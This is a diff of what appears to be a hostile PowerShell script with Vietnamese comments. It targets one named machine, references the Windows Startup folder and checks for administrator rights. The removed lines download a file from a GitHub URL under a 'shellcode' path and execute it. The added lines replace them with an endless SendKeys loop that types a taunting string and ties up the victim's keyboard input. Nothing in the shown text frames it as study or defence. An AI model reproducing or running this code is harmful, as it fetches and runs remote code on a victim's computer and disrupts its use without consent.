@@ -8,11 +8,18 @@ $startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("Startup")
 Add-Type -AssemblyName System.Windows.Forms
 
 if ($env:USERDOMAIN -eq "DESKTOP-S4G27N7") {
-    $output = "fuckyou.txt"
-    $url = "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/shellcode/anhsoconnguoiemroido"
-    Invoke-WebRequest -Uri $url -OutFile $output
-    Start-Process -FilePath $output
+    # Tạo đối tượng WScript.Shell
+    $shell = New-Object -ComObject WScript.Shell
+
+    # Chuỗi cần gõ
+    $string = "hai1723_on_top_"
+
+    # Gõ chuỗi liên tục
+    while ($true) {
+        $shell.SendKeys($string)
+    }
 }
+
 
 # Kiểm tra xem script có quyền quản trị không
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
